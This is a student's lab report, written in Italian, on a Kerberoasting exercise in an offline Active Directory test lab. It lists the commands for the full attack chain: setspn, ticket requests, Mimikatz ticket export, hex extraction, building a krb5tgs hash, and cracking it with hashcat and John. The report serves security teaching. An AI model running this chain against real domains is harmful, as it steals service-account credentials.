# Kerberoasting – Test LAB (AD/DC offline)

## Setup iniziale

Ho seguito le istruzioni del docente per associare manualmente uno nuovo Servizio all’account Honey-Object

```powershell
setspn -A SERVICE/testservice admin.backup
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'SERVICE/testservice'
```

Poi Mimikatz per individuare il ticket RC4 (etype 23) associato allo SPN.

```powershell
kerberos::list
kerberos::list /export
```

---

## Tentativi di crack della password falliti

### kirbi2john
- Output vuoto

### John diretto
- Errore: "No hashes loaded"

### hashcat 
- OK per creare il file hash target (poi rivelatosi errato)
- vanno a vuoto in ogni variante (anche per la mancanza di un motore OpenCL nel server di esecuzione)

> Es:   .\hashcat.exe -m 13100 -a 0 C:\LAB-AD\Scripts\hash_finale.txt C:\LAB-AD\Scripts\dizionario.txt --backend-ignore-opencl --backend-ignore-cuda --force


---

## Ricorso alla IA (Copilot - GPT 5.5 Think Deeper)

Con l'aiuto della AI ho potuto verificare che
- il file `.kirbi` contiene una struttura ASN.1 completa
- i tool di cracking richiedono solo:
  - checksum
  - encrypted_data

> Questa fase rappresenta un passaggio chiave di comprensione acquisito durante il troubleshooting.

---

### HEX conversion ed Estrazione dati

```powershell
$bytes = [System.IO.File]::ReadAllBytes("file.kirbi")
$hex = ($bytes | ForEach-Object { "{0:x2}" -f $_ }) -join ""
Set-Content ticket.hex $hex
```

---

### Costruzione hash

Come da istruzioni fornite nel LAB

```powershell
$hash = '$krb5tgs$23$*admin.backup$AD-LAB-DOMAIN.LOCAL$SERVICE/testservice*$checksum$edata'
Set-Content hash_finale.txt $hash
```
---

### Cracking

```powershell
john.exe --format=krb5tgs hash_finale.txt --wordlist=dizionario.txt
```

> Hash caricato e processato correttamente.


---

## Conclusioni

### Criticità
- il formato Kerberos
- limitazioni e dipendenze dei tool automatici
- il valore del troubleshooting iterativo con IA


### Attività guidate (appunti LAB)
- configurazione SPN
- richiesta ticket
- utilizzo Mimikatz

### Attività autonome
- debugging errori
- tentativi con diversi tool
- conversione e analisi HEX

### Supporto AI
- utilizzato per comprendere struttura del ticket
- superare blocchi concettuali
- trovare nuovi script e comandi

### Esiti
[Output File](./Evidenze/Test-07.01.out)